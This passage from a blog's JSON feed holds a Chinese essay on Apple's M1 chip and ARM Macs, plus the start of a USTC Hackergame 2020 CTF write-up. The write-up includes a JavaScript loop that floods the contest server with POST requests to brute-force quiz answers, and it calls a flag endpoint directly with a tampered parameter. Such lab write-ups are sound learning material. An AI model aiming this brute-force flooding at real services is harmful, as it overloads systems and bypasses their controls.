class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 